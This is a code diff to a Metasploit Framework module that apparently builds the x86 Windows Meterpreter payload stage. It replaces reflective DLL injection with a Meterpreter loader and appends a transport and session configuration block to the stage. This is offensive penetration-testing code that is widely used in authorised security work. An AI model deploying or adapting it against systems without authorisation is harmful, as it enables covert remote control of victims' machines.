@@ -5,19 +5,20 @@
 
 
 require 'msf/core'
-require 'msf/core/payload/windows/reflectivedllinject'
+require 'msf/core/payload/windows/meterpreter_loader'
 require 'msf/base/sessions/meterpreter_x86_win'
 require 'msf/base/sessions/meterpreter_options'
 
 ###
 #
 # Injects the meterpreter server DLL via the Reflective Dll Injection payload
+# along with transport related configuration.
 #
 ###
 
-module Metasploit3
+module Metasploit4
 
-  include Msf::Payload::Windows::ReflectiveDllInject
+  include Msf::Payload::Windows::MeterpreterLoader
   include Msf::Sessions::MeterpreterOptions
 
   def initialize(info = {})
@@ -28,14 +29,29 @@ module Metasploit3
       'PayloadCompat' => { 'Convention' => 'sockedi', },
       'License'       => MSF_LICENSE,
       'Session'       => Msf::Sessions::Meterpreter_x86_Win))
-
-    # Don't let people set the library name option
-    options.remove_option('LibraryName')
-    options.remove_option('DLL')
   end
 
-  def library_path
-    MeterpreterBinaries.path('metsrv','x86.dll')
+  def stage_payload
+    stage_meterpreter + generate_config
+  end
+
+  def generate_config
+    # create the configuration block, which for staged connections is really simple.
+    config_opts = {
+      :expiration     => datastore['SessionExpirationTimeout'].to_i,
+      :uuid           => Msf::Payload::UUID.new({
+        :platform     => 'windows',
+        :arch         => ARCH_X86
+      }),
+      :transports     => [ generate_transport_config ],
+      :extensions     => []
+    }
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
   end
 
 end
